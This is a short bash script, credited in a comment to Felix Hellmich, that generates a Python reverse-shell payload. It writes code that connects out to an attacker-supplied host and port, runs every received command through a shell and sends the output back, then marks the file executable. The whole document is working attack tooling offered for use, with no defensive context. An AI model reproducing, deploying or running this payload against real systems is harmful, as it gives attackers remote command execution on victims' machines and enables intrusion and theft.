#!/bin/bash
# Written by Felix Hellmich

# show usage if needed
if [[ $1 == '' || $1 == '-h' || $1 == '--help' || $1 == '-u' || $1 == '--usage' ]]; then
	echo "usage: <HOST> <PORT> </path/to/file(default=/tmp/payload.py)>"; exit; fi
# create output file and set file name 
if [[ $3 == '' ]]; then file="/tmp/payload.py"; else file="$3"; fi; touch $file
# write payload
echo "#!/usr/bin/python3" >> $file
echo -e "\n" >> $file
echo "import socket, subprocess" >> $file
echo "HOST = '$1'" >> $file
echo "PORT = $2" >> $file
echo "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" >> $file
echo "s.connect((HOST, PORT))" >> $file
echo -E "s.send('[*] Connection Established ...\n'.encode('ascii'))" >> $file
echo "while 1:" >> $file
echo "	data = s.recv(1024)" >> $file
echo "	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)" >> $file
echo "	stdout_value = proc.stdout.read() + proc.stderr.read()" >> $file
echo "	s.send(stdout_value)" >> $file
echo "s.close()" >> $file
# print status
[[ -f $file ]] && echo "Successfully created reverse shell payload in $file ..." &&
	chmod +x $file # give rights
[[ ! -f $file ]] && echo "script:err: An error occured during the process of creating $file ..." && exit
